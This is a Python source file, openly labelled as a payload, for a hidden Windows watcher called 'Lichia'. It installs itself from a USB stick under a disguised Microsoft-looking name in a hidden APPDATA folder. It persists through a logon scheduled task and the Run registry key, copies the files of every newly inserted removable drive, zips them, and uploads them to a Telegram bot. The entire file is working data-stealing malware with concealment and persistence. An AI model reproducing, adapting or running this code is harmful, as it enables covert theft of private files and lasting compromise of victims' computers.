# language: Python 3.10+, file: LichiaPayload.py, target: Windows 11, stdlib only
# Watcher oculto: instala-se a partir do pendrive, aguarda novo disco removivel,
# copia o conteudo, empacota e envia ao bot Telegram. Sem console, sem UI.
import ctypes
import json
import os
import shutil
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
import uuid
import winreg
import zipfile
from pathlib import Path

APP_NAME = "Lichia"
CFG_NAME = "lichen.config"
STAGED_DIR = Path(os.getenv("APPDATA")) / "Microsoft" / "Lichia"
STAGED_EXE = STAGED_DIR / "MicrosoftSyncHost.exe"
STAGED_CFG = STAGED_DIR / CFG_NAME
CACHE_DIR = STAGED_DIR / "cache"
SKIP_NAMES = {
    "System Volume Information", "$RECYCLE.BIN", "Lichia",
    CFG_NAME, "bootstrap.bat", "autorun.inf", "LichiaPayload.exe",
}
DOC_EXT = {
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt",
    ".csv", ".jpg", ".jpeg", ".png", ".zip", ".rar", ".7z",
}
TG_LIMIT = 49 * 1024 * 1024

FILE_ATTRIBUTE_HIDDEN = 0x02
FILE_ATTRIBUTE_SYSTEM = 0x04
CREATE_NO_WINDOW = 0x08000000


def set_hidden(path):
    ctypes.windll.kernel32.SetFileAttributesW(
        str(path), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)


def removable_drives():
    mask = ctypes.windll.kernel32.GetLogicalDrives()
    out = []
    for i in range(26):
        if mask & (1 << i):
            letter = f"{chr(ord('A') + i)}:"
            if ctypes.windll.kernel32.GetDriveTypeW(letter) == 2:
                out.append(letter + "\\")
    return out


def load_cfg():
    return json.loads(STAGED_CFG.read_text(encoding="utf-8"))


def tg_send_text(token, chat_id, text):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = urllib.parse.urlencode({"chat_id": chat_id, "text": text[:3500]}).encode()
    req = urllib.request.Request(url, data=data)
    with urllib.request.urlopen(req, timeout=30) as r:
        return 200 <= r.status < 300


def tg_upload(token, chat_id, path, caption):
    boundary = "----Lichia" + uuid.uuid4().hex[:16]

    header = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
        f"{chat_id}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
        f"{caption}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"document\"; "
        f"filename=\"{path.name}\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode("utf-8")


    tail = f"\r\n--{boundary}--\r\n".encode("utf-8")

    url = f"https://api.telegram.org/bot{token}/sendDocument"
    req = urllib.request.Request(
        url, data=header + path.read_bytes() + tail,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    with urllib.request.urlopen(req, timeout=180) as r:
        return 200 <= r.status < 300


def collect(root: Path, cfg):
    max_bytes = int(cfg.get("max_mb", 200)) * 1024 * 1024
    mode = cfg.get("modo", "all")
    out = []
    for p in root.rglob("*"):
        try:
            if not p.is_file():
                continue
            if p.name in SKIP_NAMES:
                continue
            if any(part in SKIP_NAMES for part in p.parts):
                continue
            if p.stat().st_size > max_bytes:
                continue
            if mode == "docs" and p.suffix.lower() not in DOC_EXT:
                continue
            out.append((p.relative_to(root), p))
        except OSError:
            continue
    return out


def send_chunked(cfg, zpath: Path):
    token, chat = cfg["token"], cfg["chat_id"]
    size = zpath.stat().st_size
    parts = (size + TG_LIMIT - 1) // TG_LIMIT
    with zpath.open("rb") as f:
        for i in range(parts):
            chunk = f.read(TG_LIMIT)
            tmp = STAGED_DIR / f"lichen.part{i + 1}.zip"
            tmp.write_bytes(chunk)
            try:
                tg_upload(token, chat, tmp,
                          f"parte {i + 1}/{parts} — {zpath.name}")
            finally:
                tmp.unlink(missing_ok=True)


def exfil_drive(drive):
    try:
        cfg = load_cfg()
        root = Path(drive)

        if (root / CFG_NAME).exists():
            return

        time.sleep(4)
        files = collect(root, cfg)
        if not files:
            return

        if CACHE_DIR.exists():
            shutil.rmtree(CACHE_DIR, ignore_errors=True)
        CACHE_DIR.mkdir(parents=True, exist_ok=True)

        copied = 0
        for rel, src in files:
            dst = CACHE_DIR / rel
            dst.parent.mkdir(parents=True, exist_ok=True)
            try:
                shutil.copy2(src, dst)
                copied += 1
            except OSError:
                continue

        if not copied:
            return

        zpath = STAGED_DIR / "lichen.zip"
        zpath.unlink(missing_ok=True)
        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as z:
            for f in CACHE_DIR.rglob("*"):
                if f.is_file():
                    z.write(f, f.relative_to(CACHE_DIR))


        total_mb = sum(s.stat().st_size for _, s in files) / (1024 * 1024)
        tg_send_text(cfg["token"], cfg["chat_id"],
                     f"lichia: {copied} arquivos de {drive} — {total_mb:.1f} MB")

        if zpath.stat().st_size <= TG_LIMIT:
            tg_upload(cfg["token"], cfg["chat_id"], zpath, "")
        else:
            send_chunked(cfg, zpath)

        shutil.rmtree(CACHE_DIR, ignore_errors=True)
        zpath.unlink(missing_ok=True)
    except Exception:
        pass


def hide_staged():
    if not STAGED_DIR.exists():
        return
    set_hidden(STAGED_DIR)
    for p in STAGED_DIR.iterdir():
        set_hidden(p)


def persist():
    tr = f'"{STAGED_EXE}" --watch'
    try:
        subprocess.run(
            ["schtasks", "/Create", "/F", "/SC", "ONLOGON",
             "/TN", APP_NAME, "/TR", tr],
            capture_output=True, creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, tr)
        winreg.CloseKey(key)
    except Exception:
        pass


def self_path() -> Path:
    if getattr(sys, "frozen", False):
        return Path(sys.executable)
    return Path(sys.argv[0]).resolve()


def install_from(origin: Path):
    cfg_src = origin / "Lichia" / CFG_NAME
    exe_src = self_path()
    if not cfg_src.exists():
        cfg_src = origin / CFG_NAME
    if not cfg_src.exists():
        return


    STAGED_DIR.mkdir(parents=True, exist_ok=True)
    shutil.copy2(exe_src, STAGED_EXE)
    shutil.copy2(cfg_src, STAGED_CFG)
    hide_staged()
    persist()

    subprocess.Popen([str(STAGED_EXE), "--watch"],
                     creationflags=CREATE_NO_WINDOW)


def watch_loop():
    known = set(removable_drives())
    while True:
        try:
            now = set(removable_drives())
        except Exception:
            time.sleep(5)
            continue
        for d in now - known:
            threading.Thread(target=exfil_drive,
                             args=(d,), daemon=True).start()
        known = now
        time.sleep(3)


def origin_drive():
    for a in sys.argv[1:]:
        if len(a) == 2 and a[1] == ":":
            return Path(a + "\\")
    return Path(Path(sys.executable).drive + "\\")


def main():
    if "--install" in sys.argv:
        install_from(origin_drive())
        return
    if "--watch" in sys.argv and STAGED_CFG.exists():
        hide_staged()
        watch_loop()


if __name__ == "__main__":
    main()
